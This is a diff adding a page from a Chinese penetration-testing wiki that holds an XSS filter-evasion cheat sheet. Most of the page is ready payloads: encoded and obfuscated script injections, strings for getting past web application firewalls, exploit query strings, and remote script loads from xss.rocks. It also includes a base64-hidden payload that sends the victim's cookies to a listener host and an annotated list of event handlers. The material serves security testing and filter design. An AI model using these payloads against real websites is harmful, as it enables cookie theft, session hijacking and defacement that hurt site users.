+&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;<br/>
+&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;<br/>
+&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;<br/>
+&lt;/BODY&gt;&lt;/HTML&gt;    仅在html和body标签之间才能工作<br/>
+&lt;SCRIPT SRC=&quot;http://xss.rocks/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;    可以将javascript文件重命名为xss payload 的图像<br/>
+&lt;!--#exec cmd=&quot;/bin/echo &#39;&lt;SCR&#39;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &#39;IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;&#39;&quot;--&gt;    需要服务器安装ssl<br/>
+&lt;? echo(&#39;&lt;SCR)&#39;;<br/>
+echo(&#39;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;); ?&gt;    需要服务器安装php<br/>
+&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;<br/>
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser<br/>
+&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;&gt;    修改cookie<br/>
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&#39;XSS&#39;);+ADw-/SCRIPT+AD4-    utf-7编码，在google的404脚本中找到了这个漏洞
+</code></pre></li>
+<li><p>本地htc文件</p>
+<p><code>&lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&gt;</code></p></li>
+<li><p>US-ASCII编码</p>
+<p>US-ASCII编码（由Kurt Huwig发现）。这使用7位而不是8位的格式错误的ASCII编码。此XSS可能绕过许多内容过滤器，但仅在主机以US-ASCII编码传输时，或者如果您自己设置编码时才有效。这对于Web应用程序防火墙跨站点脚本规避而言比对服务器端过滤器规避更有用。Apache Tomcat是唯一以US-ASCII编码传输的已知服务器。</p>
+<p><code>¼script¾alert(¢XSS¢)¼/script¾</code></p></li>
+<li><p>META标签</p>
+<p>&lt;<em>meta</em>&gt; 元素可提供有关页面的元信息(<em>meta</em>-information),比如针对搜索引擎和更新频度的描述和关键词。</p>
+<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
+<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</code>        base64编码</p>
+<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
+<li><p>DIV标签</p>
+<p><code>&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</code></p>
+<ul>
+<li>具有单一编码xss漏洞的div背景图像</li>
+</ul>
+<p><code>&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&#39;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&#39;\0029&quot;&gt;</code></p>
+<ul>
+<li>包含十六禁止</li>
+</ul>
+<p><code>&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&#39;XSS&#39;))&quot;&gt;</code></p>
+<ul>
+<li>div表达式</li>
+</ul>
+<p><code>&lt;DIV STYLE=&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt;</code></p></li>
+<li><p>下层隐藏块(注释)</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;!--[if gte IE 4]&gt;
+&lt;SCRIPT&gt;alert(&#39;XSS&#39;);&lt;/SCRIPT&gt;<br/>
+&lt;![endif]--&gt;
+</code></pre></li>
+<li><p>使用html引用封装</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
+&lt;SCRIPT a=&quot;&gt;&quot; &#39;&#39; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
+&lt;SCRIPT &quot;a=&#39;&gt;&#39;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
+&lt;SCRIPT a=`&gt;` SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
+&lt;SCRIPT a=&quot;&gt;&#39;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;<br/>
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</code></pre></li>
+<li><p>url字符串规避</p>
+<p>ip或主机名<br/>
+<code>&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;</code></p>
+<p>url编码</p>
+<p><code>&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;</code></p>
+<p>双字节编码</p>
+<p><code>&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;</code></p>
+<p>十六进制编码</p>
+<p><code>&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;</code></p>
+<p>八进制编码</p>
+<p><code>&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;</code></p>
+<p>base64编码</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;img onload=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=&#39;))&quot;&gt;
+</code></pre>
+<p>混合编码</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;A HREF=&quot;h
+tt    p://6   6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
+</code></pre></li>
+<li><p>协议解析绕过</p>
+<pre class="line-numbers"><code class="language-text">&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;javascript:document.location=&#39;http://www.google.com/&#39;&quot;&gt;XSS&lt;/A&gt;<br/>
+&lt;A HREF=&quot;http://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
+</code></pre></li>
+</ul>
+
+<h2 id="toc_0">字符串转义序列</h2>
+
+<p>HTML和JavaScript中字符“&lt;”的所有可能组合。其中大部分都不会开箱即用，但如上所述，其中许多都可以在某些情况下渲染。</p>
+
+<pre class="line-numbers"><code class="language-text">&lt;
+%3C
+&amp;lt
+&amp;lt;
+&amp;LT
+&amp;LT;
+&amp;#60
+&amp;#060
+&amp;#0060
+&amp;#00060
+&amp;#000060
+&amp;#0000060
+&amp;#60;
+&amp;#060;
+&amp;#0060;
+&amp;#00060;
+&amp;#000060;
+&amp;#0000060;
+&amp;#x3c
+&amp;#x03c
+&amp;#x003c
+&amp;#x0003c
+&amp;#x00003c
+&amp;#x000003c
+&amp;#x3c;
+&amp;#x03c;
+&amp;#x003c;
+&amp;#x0003c;
+&amp;#x00003c;
+&amp;#x000003c;
+&amp;#X3c
+&amp;#X03c
+&amp;#X003c
+&amp;#X0003c
+&amp;#X00003c
+&amp;#X000003c
+&amp;#X3c;
+&amp;#X03c;
+&amp;#X003c;
+&amp;#X0003c;
+&amp;#X00003c;
+&amp;#X000003c;
+&amp;#x3C
+&amp;#x03C
+&amp;#x003C
+&amp;#x0003C
+&amp;#x00003C
+&amp;#x000003C
+&amp;#x3C;
+&amp;#x03C;
+&amp;#x003C;
+&amp;#x0003C;
+&amp;#x00003C;
+&amp;#x000003C;
+&amp;#X3C
+&amp;#X03C
+&amp;#X003C
+&amp;#X0003C
+&amp;#X00003C
+&amp;#X000003C
+&amp;#X3C;
+&amp;#X03C;
+&amp;#X003C;
+&amp;#X0003C;
+&amp;#X00003C;
+&amp;#X000003C;
+\x3c
+\x3C
+\u003c
+\u003C
+</code></pre>
+
+<h2 id="toc_1">绕过waf的方法</h2>
+
+<ul>
+<li><p>存储型xss</p>
+<p>如果攻击者设法通过过滤器过滤xss，则waf无法阻止攻击传导</p></li>
+<li><p>发射型xss</p>
+<pre class="line-numbers"><code class="language-text">示例: &lt;script&gt; ... setTimeout(\&quot;writetitle()\&quot;,$_GET[xss]) ... &lt;/script&gt;
+利用: /?xss=500); alert(document.cookie);//
+</code></pre></li>
+<li><p>dom型xss</p>
+<pre class="line-numbers"><code class="language-text">示例: &lt;script&gt; ... eval($_GET[xss]); ... &lt;/script&gt;
+利用: /?xss=document.cookie
+</code></pre></li>
+<li><p>xss通过请求重定向</p>
+<p>易受攻击的代码</p>
+<pre class="line-numbers"><code class="language-text">...
+header(&#39;Location: &#39;.$_GET[&#39;param&#39;]);<br/>
+...<br/>
+以及<br/>
+...<br/>
+header(&#39;Refresh: 0; URL=&#39;.$_GET[&#39;param&#39;]);<br/>
+...
+</code></pre>
+<p>此请求不会通过waf：</p>
+<p><code>/?param=javascript:alert(document.cookie)</code></p>
+<p>此请求将通过waf，并且将在某些浏览器中执行</p>
+<p><code>/?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=</code></p></li>
+<li><p>用户xss的 waf bypass 字符串</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;Img src = x onerror = &quot;javascript: window.onerror = alert; throw XSS&quot;&gt;
+&lt;Video&gt; &lt;source onerror = &quot;javascript: alert (XSS)&quot;&gt;<br/>
+&lt;Input value = &quot;XSS&quot; type = text&gt;<br/>
+&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt;<br/>
+&lt;isindex x=&quot;javascript:&quot; onmouseover=&quot;alert(XSS)&quot;&gt;<br/>
+&quot;&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;<br/>
+&quot;&gt;&lt;img src=&quot;x:x&quot; onerror=&quot;alert(XSS)&quot;&gt;<br/>
+&quot;&gt;&lt;iframe src=&quot;javascript:alert(XSS)&quot;&gt;<br/>
+&lt;object data=&quot;javascript:alert(XSS)&quot;&gt;<br/>
+&lt;isindex type=image src=1 onerror=alert(XSS)&gt;<br/>
+&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;<br/>
+&lt;img  src=&quot;x:gif&quot; onerror=&quot;window[&#39;al\u0065rt&#39;](0)&quot;&gt;&lt;/img&gt;<br/>
+&lt;iframe/src=&quot;data:text/html,&lt;svg onload=alert(1)&gt;&quot;&gt;<br/>
+&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;<br/>
+&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open(&#39;https://www.google.com/&#39;)&gt;&lt;/script<br/>
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&gt;<br/>
+&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;<br/>
+&lt;form&gt;&lt;a href=&quot;javascript:\u0061lert(1)&quot;&gt;X<br/>
+&lt;/script&gt;&lt;img/*%00/src=&quot;worksinchrome&amp;colon;prompt(1)&quot;/%00*/onerror=&#39;eval(src)&#39;&gt;<br/>
+&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt; <br/>
+鼠标悬停在上面<br/>
+&lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror=&#39;prompt(1)&#39;&quot;&gt;<br/>
+&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe<br/>
+&lt;script x&gt; alert(1) &lt;/script 1=2<br/>
+&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME<br/>
+&lt;input/onmouseover=&quot;javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;&quot;<br/>
+&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;
+</code></pre></li>
+<li><p>过滤旁路警报混淆</p>
+<pre class="line-numbers"><code class="language-text">(alert)(1)
+a=alert,a(1)<br/>
+[1].find(alert)<br/>
+top[“al”+”ert”](1)<br/>
+top[/al/.source+/ert/.source](1)<br/>
+al\u0065rt(1)<br/>
+top[‘al\145rt’](1)<br/>
+top[‘al\x65rt’](1)<br/>
+top[8680439..toString(30)](1)
+</code></pre></li>
+</ul>
+
+<h2 id="toc_2">事件处理程序</h2>
+
+<p>可以参考dottoro的网站<a href="http://help.dottoro.com/ljfvvdnm.php">javascript事件列表</a></p>
+
+<ol>
+<li><code>FSCommand()</code> （攻击者可以在嵌入式Flash对象中执行时使用此功能）</li>
+<li><code>onAbort()</code> （当用户中止加载图像时）</li>
+<li><code>onActivate()</code> （当对象设置为活动元素时）</li>
+<li><code>onAfterPrint()</code> （在用户打印或预览打印作业后激活）</li>
+<li><code>onAfterUpdate()</code> （在更新源对象中的数据后激活数据对象）</li>
+<li><code>onBeforeActivate()</code> （在将对象设置为活动元素之前触发）</li>
+<li><code>onBeforeCopy()</code>（攻击者在选择复制到剪贴板之前执行攻击字符串 - 攻击者可以使用该<code>execCommand(&quot;Copy&quot;)</code>功能执行此操作）</li>
+<li><code>onBeforeCut()</code> （攻击者在切换选择之前执行攻击字符串）</li>
+<li><code>onBeforeDeactivate()</code> （从当前对象更改activeElement后立即触发）</li>
+<li><code>onBeforeEditFocus()</code> （在可编辑元素中包含的对象进入UI激活状态或选择了可编辑容器对象的控件之前触发）</li>
+<li><code>onBeforePaste()</code>（用户需要被欺骗粘贴或使用该<code>execCommand(&quot;Paste&quot;)</code>功能强制进入它）</li>
+<li><code>onBeforePrint()</code>（用户需要被欺骗打印或攻击者可以使用<code>print()</code>或<code>execCommand(&quot;Print&quot;)</code>功能）。</li>
+<li><code>onBeforeUnload()</code> （用户需要被欺骗关闭浏览器 - 攻击者无法卸载窗口，除非它是从父级生成的）</li>
+<li><code>onBeforeUpdate()</code> （在更新源对象中的数据之前激活数据对象）</li>
+<li><code>onBegin()</code> （当元素的时间轴开始时，onbegin事件立即触发）</li>
+<li><code>onBlur()</code> （在加载另一个弹出窗口且窗口失去焦点的情况下）</li>
+<li><code>onBounce()</code> （当marquee对象的behavior属性设置为“alternate”并且选取框的内容到达窗口的一侧时触发）</li>
+<li><code>onCellChange()</code> （数据提供程序中的数据更改时触发）</li>
+<li><code>onChange()</code> （select，text或TEXTAREA字段失去焦点，其值已被修改）</li>
+<li><code>onClick()</code> （有人点击表格）</li>
+<li><code>onContextMenu()</code> （用户需要右键单击攻击区域）</li>
+<li><code>onControlSelect()</code> （当用户即将对对象进行控制选择时触发）</li>
+<li><code>onCopy()</code>（用户需要复制某些东西或者可以使用该<code>execCommand(&quot;Copy&quot;)</code>命令来利用它）</li>
+<li><code>onCut()</code>（用户需要复制某些东西或者可以使用该<code>execCommand(&quot;Cut&quot;)</code>命令来利用它）</li>
+<li><code>onDataAvailable()</code> （用户需要更改元素中的数据，否则攻击者可以执行相同的功能）</li>
+<li><code>onDataSetChanged()</code> （当数据源对象公开的数据集发生更改时触发）</li>
+<li><code>onDataSetComplete()</code> （触发表示所有数据都可从数据源对象获得）</li>
+<li><code>onDblClick()</code> （用户双击表单元素或链接）</li>
+<li><code>onDeactivate()</code> （当activeElement从当前对象更改为父文档中的另一个对象时触发）</li>
+<li><code>onDrag()</code> （要求用户拖动对象）</li>
+<li><code>onDragEnd()</code> （要求用户拖动对象）</li>
+<li><code>onDragLeave()</code> （要求用户将对象拖离有效位置）</li>
+<li><code>onDragEnter()</code> （要求用户将对象拖动到有效位置）</li>
+<li><code>onDragOver()</code> （要求用户将对象拖动到有效位置）</li>
+<li><code>onDragDrop()</code> （用户将对象（例如文件）放到浏览器窗口中）</li>
+<li><code>onDragStart()</code> （当用户开始拖动操作时发生）</li>
+<li><code>onDrop()</code> （用户将对象（例如文件）放到浏览器窗口中）</li>
+<li><code>onEnd()</code> （当时间线结束时，onEnd事件将触发。</li>
+<li><code>onError()</code> （加载文档或图像会导致错误）</li>
+<li><code>onErrorUpdate()</code> （在更新数据源对象中的关联数据时发生错误时在数据绑定对象上触发）</li>
+<li><code>onFilterChange()</code> （当可视化过滤器完成状态更改时触发）</li>
+<li><code>onFinish()</code> （当marquee完成循环时，攻击者可以创建漏洞）</li>
+<li><code>onFocus()</code> （攻击者在窗口获得焦点时执行攻击字符串）</li>
+<li><code>onFocusIn()</code> （攻击者在窗口获得焦点时执行攻击字符串）</li>
+<li><code>onFocusOut()</code> （当窗口失去焦点时，攻击者执行攻击字符串）</li>
+<li><code>onHashChange()</code> （当文档的当前地址的片段标识符部分发生更改时触发）</li>
+<li><code>onHelp()</code> （攻击者在窗口聚焦时用户点击F1时执行攻击字符串）</li>
+<li><code>onInput()</code> （通过用户界面更改元素的文本内容）</li>
+<li><code>onKeyDown()</code> （用户按下一个键）</li>
+<li><code>onKeyPress()</code> （用户按下或按住键）</li>
+<li><code>onKeyUp()</code> （用户发布密钥）</li>
+<li><code>onLayoutComplete()</code> （用户必须打印或打印预览）</li>
+<li><code>onLoad()</code> （攻击者在窗口加载后执行攻击字符串）</li>
+<li><code>onLoseCapture()</code>（可以通过该<code>releaseCapture()</code>方法利用）</li>
+<li><code>onMediaComplete()</code> （使用流媒体文件时，此事件可能会在文件开始播放之前触发）</li>
+<li><code>onMediaError()</code> （用户在浏览器中打开包含媒体文件的页面，并在出现问题时触发事件）</li>
+<li><code>onMessage()</code> （文件收到消息时开火）</li>
+<li><code>onMouseDown()</code> （攻击者需要让用户点击图像）</li>
+<li><code>onMouseEnter()</code> （光标在对象或区域上移动）</li>
+<li><code>onMouseLeave()</code> （攻击者需要让用户将鼠标悬停在图像或表格上然后再关闭）</li>
+<li><code>onMouseMove()</code> （攻击者需要让用户将鼠标悬停在图像或表格上）</li>
+<li><code>onMouseOut()</code> （攻击者需要让用户将鼠标悬停在图像或表格上然后再关闭）</li>
+<li><code>onMouseOver()</code> （光标在对象或区域上移动）</li>
+<li><code>onMouseUp()</code> （攻击者需要让用户点击图像）</li>
+<li><code>onMouseWheel()</code> （攻击者需要让用户使用他们的鼠标滚轮）</li>
+<li><code>onMove()</code> （用户或攻击者会移动页面）</li>
+<li><code>onMoveEnd()</code> （用户或攻击者会移动页面）</li>
+<li><code>onMoveStart()</code> （用户或攻击者会移动页面）</li>
+<li><code>onOffline()</code> （如果浏览器在在线模式下工作并且它开始脱机工作，则会出现）</li>
+<li><code>onOnline()</code> （如果浏览器在离线模式下工作并且它开始在线工作，则会出现）</li>
+<li><code>onOutOfSync()</code> （中断元素播放时间轴定义的媒体的能力）</li>
+<li><code>onPaste()</code>（用户需要粘贴或攻击者可以使用该<code>execCommand(&quot;Paste&quot;)</code>功能）</li>
+<li><code>onPause()</code> （onpause事件触发时间线暂停时活动的每个元素，包括body元素）</li>
+<li><code>onPopState()</code> （用户导航会话历史记录时触发）</li>
+<li><code>onProgress()</code> （攻击者会使用此作为flash电影加载）</li>
+<li><code>onPropertyChange()</code> （用户或攻击者需要更改元素属性）</li>
+<li><code>onReadyStateChange()</code> （用户或攻击者需要更改元素属性）</li>
+<li><code>onRedo()</code> （用户在撤消事务历史记录中前进）</li>
+<li><code>onRepeat()</code> （每次重复时间线时，事件都会触发一次，不包括第一个完整周期）</li>
+<li><code>onReset()</code> （用户或攻击者重置表单）</li>
+<li><code>onResize()</code>（用户将调整窗口的大小，攻击者就可以自动与像初始化：<code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>）</li>
+<li><code>onResizeEnd()</code>（用户将调整窗口的大小，攻击者就可以自动与像初始化：<code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>）</li>
+<li><code>onResizeStart()</code>（用户将调整窗口的大小，攻击者就可以自动与像初始化：<code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>）</li>
+<li><code>onResume()</code> （onresume事件触发时间线恢复时变为活动的每个元素，包括body元素）</li>
+<li><code>onReverse()</code> （如果元素的repeatCount大于1，则每次时间轴开始向后播放时都会触发此事件）</li>
+<li><code>onRowsEnter()</code> （用户或攻击者需要更改数据源中的行）</li>
+<li><code>onRowExit()</code> （用户或攻击者需要更改数据源中的行）</li>
+<li><code>onRowDelete()</code> （用户或攻击者需要删除数据源中的行）</li>
+<li><code>onRowInserted()</code> （用户或攻击者需要在数据源中插入一行）</li>
+<li><code>onScroll()</code>（用户需要滚动，否则攻击者可以使用该<code>scrollBy()</code>功能）</li>
+<li><code>onSeek()</code> （当时间轴设置为向前以外的任何方向播放时，onreverse事件将触发）</li>
+<li><code>onSelect()</code>（用户需要选择一些文本-攻击者就可以自动与像初始化：<code>window.document.execCommand(&quot;SelectAll&quot;);</code>）</li>
+<li><code>onSelectionChange()</code>（用户需要选择一些文本-攻击者就可以自动与像初始化：<code>window.document.execCommand(&quot;SelectAll&quot;);</code>）</li>
+<li><code>onSelectStart()</code>（用户需要选择一些文本-攻击者就可以自动与像初始化：<code>window.document.execCommand(&quot;SelectAll&quot;);</code>）</li>
+<li><code>onStart()</code> （在每个选框循环开始时触发）</li>
+<li><code>onStop()</code> （用户需要按停止按钮或离开网页）</li>
+<li><code>onStorage()</code> （存储区域已更改）</li>
+<li><code>onSyncRestored()</code> （用户中断元素播放其时间线所定义的媒体的能力）</li>
+<li><code>onSubmit()</code> （要求攻击者或用户提交表单）</li>
+<li><code>onTimeError()</code> （用户或攻击者将时间属性（例如dur）设置为无效值）</li>
+<li><code>onTrackChange()</code> （用户或攻击者更改播放列表中的曲目）</li>
+<li><code>onUndo()</code> （用户在撤消事务历史记录中后退）</li>
+<li><code>onUnload()</code> （当用户点击任何链接或按下后退按钮或攻击者强制点击时）</li>
+<li><code>onURLFlip()</code> （当由HTML + TIME（定时交互式多媒体扩展）媒体标记播放的高级流格式（ASF）文件处理嵌入在ASF文件中的脚本命令时，此事件将触发）</li>
+<li><code>seekSegmentTime()</code> （这是一种方法，它定位元素的段时间线上的指定点并从该点开始播放。该段包含一次重复的时间线，包括使用AUTOREVERSE属性进行反向播放。）</li>
+</ol>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 16:18 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+              
+
+
+			<div class="row">
+			  <div class="large-6 columns">
+			  <p class="text-left" style="padding-top:25px;">
+			   <a href="渗透测试_9.html">&laquo; Prev Page</a>  
+			  </p>
+			  </div>
+			  <div class="large-6 columns">
+			<p class="text-right" style="padding-top:25px;">
+			 <a href="渗透测试_11.html">&raquo; Next Page</a> 
+			</p>
+			  </div>
+			</div>
+		</div>
+	</div><!-- large 8 -->
+
+ <div class="large-4 medium-4 columns">
+  <div class="hide-for-small">
+    <div id="sidebar" class="sidebar">
+          <div id="site-info" class="site-info">
+            
+                <div class="site-a-logo"><img src="http://images.lonelyor.org/favicon.jpg" /></div>
+            
+                <h1>lonelyorWiki</h1>
+                <div class="site-des">一个用来记录知识的网站</div>
+                <div class="social">
+
+
+
+
+
+
+
+
+
+<a target="_blank" class="github" target="_blank" href="https://github.com/AlShelley/lonelyorWiki" title="GitHub">GitHub</a>
+<a target="_blank" class="email" href="mailto:lonelyor.org@gmail.com" title="Email">Email</a>
+  <a target="_blank" class="rss" href="atom.xml" title="RSS">RSS</a>
+                
+              	 </div>
+          	</div>
+
+             
+
+              <div id="site-categories" class="side-item ">
+                <div class="side-header">
+                  <h2>Categories</h2>
+                </div>
+                <div class="side-content">
+
+      	<p class="cat-list">
+        
+            <a href="%E7%B3%BB%E7%BB%9F.html"><strong>系统</strong></a>
+        
+            <a href="%E7%BD%91%E7%BB%9C.html"><strong>网络</strong></a>
+        
+            <a href="%E5%BC%80%E5%8F%91.html"><strong>开发</strong></a>
+        
+            <a href="%E5%B7%A5%E5%85%B7.html"><strong>工具</strong></a>
+        
+            <a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"><strong>渗透测试</strong></a>
+        
+            <a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html"><strong>风花雪月</strong></a>
+        
+            <a href="%E6%98%9F%E7%81%AB%E6%B5%81%E8%90%A4.html"><strong>星火流萤</strong></a>
+         
+        </p>
+
+
+                </div>
+              </div>
+
+              <div id="site-categories" class="side-item">
+                <div class="side-header">
+                  <h2>Recent Posts</h2>
+                </div>
+                <div class="side-content">
+                <ul class="posts-list">
+	      
+		      
+			      <li class="post">
+			        <a href="15532149133328.html">古语</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15523826250881.html">excel 工作表插入当前时间和日期</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15520392147631.html">GTD 管理法</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15520390232741.html">用四象限管理任务</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15520320136368.html">bundle install 无法使用的解决办法</a>
+			      </li>
+		     
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		   
+		  		</ul>
+                </div>
+              </div>
+        </div><!-- sidebar -->
+      </div><!-- hide for small -->
+</div><!-- large 4 -->
+
+</div><!-- row -->
+
+ <div class="page-bottom clearfix">
+  <div class="row">
+   <p class="copyright">Copyright &copy; 2018
+Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a>,&nbsp; 
+Theme used <a target="_blank" href="http://github.com">GitHub CSS</a>.</p>
+  </div>
+</div>
+
+        </section>
+      </div>
+    </div>
+
+  
+    
+
+    <script src="asset/js/foundation.min.js"></script>
+    <script>
+      $(document).foundation();
+      function fixSidebarHeight(){
+        var w1 = $('.markdown-body').height();
+          var w2 = $('#sidebar').height();
+          if (w1 > w2) { $('#sidebar').height(w1); };
+      }
+      $(function(){
+        fixSidebarHeight();
+      })
+      $(window).load(function(){
+          fixSidebarHeight();
+      });
+     
+    </script>
+
+    
+
+
+
+  </body>
+</html>
